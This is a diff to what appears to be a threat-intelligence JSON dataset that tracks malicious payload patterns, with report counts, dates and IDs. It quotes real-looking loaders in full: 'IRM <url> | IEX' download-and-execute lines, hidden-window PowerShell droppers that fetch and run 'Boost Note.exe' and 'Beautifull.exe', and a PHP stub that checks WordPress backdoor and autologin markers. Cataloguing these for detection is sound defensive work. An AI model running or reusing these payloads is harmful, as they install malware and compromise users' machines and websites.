@@ -526,16 +526,11 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 16,
-    "ReportCount": 149,
-    "FirstSeen": "2026-11-09T21:46:06.578000+00:00",
+    "DistinctPayloadCount": 15,
+    "ReportCount": 144,
+    "FirstSeen": "2026-11-10T13:31:52.884000+00:00",
     "LastSeen": "2026-11-16T18:11:22.915000+00:00",
     "ReportIds": [
-      "cmw9sj86l05zm0omlpfcti0fc",
-      "cmw9skaqb064e0omlfadn4wxj",
-      "cmw9sorkd068e0omlra2re0mm",
-      "cmw9spkbj06990omlfg3o6wbt",
-      "cmw9srt1q06cd0omlh9mc1uk8",
       "cmwaqbhyx022q0oml78i982wh",
       "cmwaqfk6e027u0omlrrf8nufh",
       "cmwar8gmr02l00oml9bak5oxu",
@@ -696,18 +691,16 @@
       "IRM gitlab[.]com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f | IEX",
       "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
       "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-      "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
       "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX"
     ]
   },
   {
     "Pattern": "$tok='<TOKEN>';$id='<HEX_ID>';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
-    "DistinctPayloadCount": 16,
-    "ReportCount": 16,
-    "FirstSeen": "2026-11-09T21:42:49.329000+00:00",
+    "DistinctPayloadCount": 15,
+    "ReportCount": 15,
+    "FirstSeen": "2026-11-10T15:04:27.972000+00:00",
     "LastSeen": "2026-11-16T03:23:58.541000+00:00",
     "ReportIds": [
-      "cmw9sf00505q40omll93y5pf4",
       "cmwatmk9j042v0oml5p2hxaki",
       "cmwauem4m04gp0omlvnwmefxk",
       "cmwbir7jv08hc0nmltai47izd",
@@ -732,7 +725,6 @@
       "$tok='N2IoT5C2CzQppBecp28PWlS7ypL0l-ives--aDT27qI';$id='611ebe8fe0e7b6c7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='TbchK47nH93fyRUgujJTEerB8tBEPjlqZlswl6UqhGg';$id='17c124bf09bf24b7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='WxWgNxe4D0-f5PrfHaxy8wunZc30NGqCe7e7DdFf0U8';$id='58ae9ac66a26ad8e';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
-      "$tok='XHSS_WIe4Mqh66raXBF1hUhOzM1uf8PM7h0gNNIG1f0';$id='8ce4c033ffe5bd99';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='XNNQbQbJ_050Pcu-Wn7o2J5j-yae7MWoKbo_ItSx650';$id='81e0e3dc5464f858';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='ZIz7n7Mcf2M4c6udAtTUpZh7XpGj3HxSY2FGHMIO1Gw';$id='44693d5cc82e3dda';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='ZJxwoAtSoXmarObW39aYMewfxZze9kK_LGG7S4xjk-k';$id='a14cafdfddf3e35d';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
@@ -782,9 +774,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 47,
+    "ReportCount": 48,
     "FirstSeen": "2026-11-10T04:54:46.148000+00:00",
-    "LastSeen": "2026-11-16T16:09:33.652000+00:00",
+    "LastSeen": "2026-11-16T21:45:26.759000+00:00",
     "ReportIds": [
       "cmwa7uhjs07yx0omlfjdv2k9y",
       "cmwafa1yg08ee0omlkfez3dt8",
@@ -832,7 +824,8 @@
       "cmwj53tef17dk0omlyyz1wnrf",
       "cmwj87puz17h00omlv4msyyuh",
       "cmwjbc38k17of0omlpeppcn8t",
-      "cmwjgldww18ag0omls2876jau"
+      "cmwjgldww18ag0omls2876jau",
+      "cmwjslc4f18z40omlmg91ed88"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
@@ -943,12 +936,10 @@
   {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
-    "ReportCount": 19,
-    "FirstSeen": "2026-11-09T21:39:28.225000+00:00",
+    "ReportCount": 17,
+    "FirstSeen": "2026-11-10T00:18:51.233000+00:00",
     "LastSeen": "2026-11-14T14:43:31.633000+00:00",
     "ReportIds": [
-      "cmw9saotl05gj0omlanf5buol",
-      "cmw9sktyg065b0omluyuqwbus",
       "cmw9xznov07gc0omlfempg6ha",
       "cmw9zizln07hd0oml2za1wlqb",
       "cmwa78v3607w70omluib5p702",
@@ -974,22 +965,10 @@
   {
     "Pattern": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"<URL>\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 16,
-    "FirstSeen": "2026-11-09T21:42:18.420000+00:00",
+    "ReportCount": 4,
+    "FirstSeen": "2026-11-10T14:43:21.485000+00:00",
     "LastSeen": "2026-11-12T11:51:47.800000+00:00",
     "ReportIds": [
-      "cmw9sec4t05nn0omlwdjnuup9",
-      "cmw9sfa3705rr0omlnlya8cyn",
-      "cmw9sfm3a05sb0omllcjd4y8e",
-      "cmw9sfwd105su0oml6cocbb2i",
-      "cmw9sg9wy05tc0oml4p0025cf",
-      "cmw9sh1y605vs0omlqjdv0orq",
-      "cmw9sh50c05w90omle4x5fc79",
-      "cmw9shf3305wt0oml1jjheemv",
-      "cmw9shln705xc0omlp9awd1n3",
-      "cmw9shs4l05xv0omlhtz5zdzi",
-      "cmw9si1j805yg0omlym3000qz",
-      "cmw9si8dw05yw0omlpbc2b3qx",
       "cmwasvf2k03dd0oml0q78fnxd",
       "cmwb6ukb801fz0nmlybxc1x8x",
       "cmwcf73lu07rj0omlahvm476x",
